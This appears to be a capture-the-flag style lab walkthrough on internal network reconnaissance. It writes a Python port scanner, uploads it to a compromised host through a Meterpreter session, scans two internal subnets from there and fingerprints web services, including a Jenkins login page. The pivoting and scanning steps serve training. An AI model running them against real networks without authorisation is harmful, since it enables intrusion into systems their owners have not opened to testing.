# Scanning the Network

Creating Python Script for Port Scanning
>``` shell
>kali@kali:~$ nano netscan.py
>
>kali@kali:~$ cat -n netscan.py
>
># ========== Expected Result ==========
>01  import socket
>02  import ipaddress
>03  import sys
>04
>05  def port_scan(ip_range, ports):
>06      for ip in ip_range:
>07          print(f"Scanning {ip}")
>08          for port in ports:
>09              sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
>10              sock.settimeout(.2)
>11              result = sock.connect_ex((str(ip), port))
>12              if result == 0:
>13                  print(f"Port {port} is open on {ip}")
>14              sock.close()
>15
>16  ip_range = ipaddress.IPv4Network(sys.argv[1], strict=False)
>17  ports = [80, 443, 8080]  # List of ports to scan
>18
>19  port_scan(ip_range, ports)
># =====================================
>```

Transfering netscan.py Script to Cloud Kali Instance
>``` shell
>kali@kali:~$ scp ./netscan.py kali@34.203.75.99:/home/kali/
>
># ========== Expected Result ==========
>kali@34.203.75.99's password: 
>netscan.py                                100%  462     2.0KB/s   00:00
># =====================================
>```

Uploading Our netscan.py Script to Target
>``` shell
>meterpreter > upload /home/kali/netscan.py /netscan.py
>
># ========== Expected Result ==========
>[*] Uploading  : /home/kali/netscan.py -> /netscan.py
>[*] Uploaded 559.00 B of 559.00 B (100.0%): /home/kali/netscan.py -> /netscan.py
>[*] Completed  : /home/kali/netscan.py -> /netscan.py
># =====================================
>```

Network Interfaces on Target
>``` shell
>meterpreter > ifconfig
>
># ========== Expected Result ==========
>Interface  1
>============
>Name         : lo
>Hardware MAC : 00:00:00:00:00:00
>MTU          : 65536
>Flags        : UP LOOPBACK RUNNING
>IPv4 Address : 127.0.0.1
>IPv4 Netmask : 255.0.0.0
>
>Interface 65
>============
>Name         : eth0
>Hardware MAC : 02:42:ac:12:00:04
>MTU          : 1500
>Flags        : UP BROADCAST RUNNING MULTICAST
>IPv4 Address : 172.18.0.4
>IPv4 Netmask : 255.255.0.0
>
>Interface 67
>============
>Name         : eth1
>Hardware MAC : 02:42:ac:1e:00:03
>MTU          : 1500
>Flags        : UP BROADCAST RUNNING MULTICAST
>IPv4 Address : 172.30.0.3
>IPv4 Netmask : 255.255.0.0
># =====================================
>```

Port Scanning on 172.18.0.1/24
>``` shell
>meterpreter > shell
>
># ========== Expected Result ==========
>Process 17 created.
>Channel 4 created.
># =====================================
>
>python /netscan.py 172.18.0.1/24
>
># ========== Expected Result ==========
>Scanning 172.18.0.0
>Scanning 172.18.0.1
>Port 80 is open on 172.18.0.1
>Scanning 172.18.0.2
>Port 80 is open on 172.18.0.2
>Scanning 172.18.0.3
>Port 80 is open on 172.18.0.3
>Scanning 172.18.0.4
>Scanning 172.18.0.5
>Port 80 is open on 172.18.0.5
>Scanning 172.18.0.6
>...
># =====================================
>```

Using Curl to Fingerprint Services
>``` shell
>curl -vv 172.18.0.1
>
># ========== Expected Result ==========
>...
>* Mark bundle as not supporting multiuse
>< HTTP/1.1 200 OK
>< Server: Caddy
>< Content-Length: 0
>...
># =====================================
>
>curl -vv 172.18.0.2
>
># ========== Expected Result ==========
>...
>* Mark bundle as not supporting multiuse
>< HTTP/1.1 200 OK
>< Server: Caddy
>< Content-Length: 0
>...
># =====================================
>```

Port Scanning on 172.30.0.1/24
>``` shell
>python /netscan.py 172.30.0.1/24
>
># ========== Expected Result ==========
>Scanning 172.30.0.0
>Scanning 172.30.0.1
>Port 80 is open on 172.30.0.1
>Scanning 172.30.0.2
>...
>Scanning 172.30.0.10
>Port 80 is open on 172.30.0.10
>Scanning 172.30.0.11
>...
>Scanning 172.30.0.30
>Port 8080 is open on 172.30.0.30
>Scanning 172.30.0.31
>...
>Scanning 172.30.0.50
>Port 8080 is open on 172.30.0.50
>Scanning 172.30.0.51
>...
>Scanning 172.30.0.60
>Port 8080 is open on 172.30.0.60
>Scanning 172.30.0.61
>...
># =====================================
>```

Discovered Jenkins Service while Running curl on Specific Endpoints
>``` shell
>curl 172.30.0.30:8080/
>
># ========== Expected Result ==========
>...
><html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'>
>...
># =====================================
>
>curl 172.30.0.30:8080/login
>
># ========== Expected Result ==========
>...
><!DOCTYPE html><html lang="en"><head resURL="/static/dd8fdc36" data-rooturl="" data-resurl="/static/dd8fdc36" data-imagesurl="/static/dd8fdc36/images"><title>Sign in [Jenkins]</title><meta name="ROBOTS" content="NOFOLLOW"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" href="/static/dd8fdc36/jsbundles/simple-page.css" type="text/css"></head><body><div class="simple-page" role="main"><div class="modal login"><div id="loginIntroDefault"><div class="logo"><img src="/static/dd8fdc36/images/svgs/logo.svg" alt="Jenkins logo"></div><h1>Welcome to Jenkins!</h1></div><form method="post" name="login" action="j_spring_security_check"><p class="signupTag simple-page--description">Please sign in below or <a href="signup">create an account</a>.<div class="jenkins-form-item jenkins-form-item--tight"><input autocorrect="off" autocomplete="off" name="j_username" id="j_username" placeholder="Username" type="text" autofocus="autofocus" class="jenkins-input normal" autocapitalize="off" aria-label="Username"></div><div class="jenkins-form-item jenkins-form-item--tight"><input name="j_password" placeholder="Password" type="password" class="jenkins-input normal" aria-label="Password"></div><div class="jenkins-checkbox jenkins-form-item jenkins-form-item--tight jenkins-!-margin-bottom-3"><input type="checkbox" id="remember_me" name="remember_me"><label for="remember_me">Keep me signed in</label></div><input name="from" type="hidden"><div class="submit"><button type="submit" name="Submit" class="jenkins-button jenkins-button--primary">Sign in</button></div></form><div class="footer"></div></div></div></body></html>
># =====================================
>```

Lab 1 - Discover the hidden HTTP service that contains a flag when visited. This service is listening on port 80.
>``` shell
>
>```
>
